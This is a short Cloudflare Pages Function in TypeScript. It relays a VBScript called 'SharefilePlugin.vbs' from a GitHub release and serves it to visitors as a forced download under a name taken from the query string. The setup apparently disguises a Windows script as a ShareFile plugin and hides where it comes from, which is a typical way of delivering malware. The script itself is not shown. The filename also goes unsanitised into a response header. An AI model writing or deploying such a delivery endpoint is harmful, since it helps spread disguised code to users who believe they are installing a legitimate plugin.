export const onRequest: PagesFunction = async (context) => {
  const url = new URL(context.request.url);
  const filename = url.searchParams.get("name") || "SharefilePlugin.vbs";

  const fileUrl =
    "https://github.com/joneraig123/vado-adb/releases/download/v1.0.0/SharefilePlugin.vbs";

  const response = await fetch(fileUrl, { redirect: "follow" });

  if (!response.ok) {
    return new Response("File not found", { status: 404 });
  }

  const headers = new Headers();
  headers.set("Content-Type", "application/octet-stream");
  headers.set("Content-Disposition", `attachment; filename="${filename}"`);
  headers.set("Cache-Control", "public, max-age=3600");

  return new Response(response.body, { status: 200, headers });
};
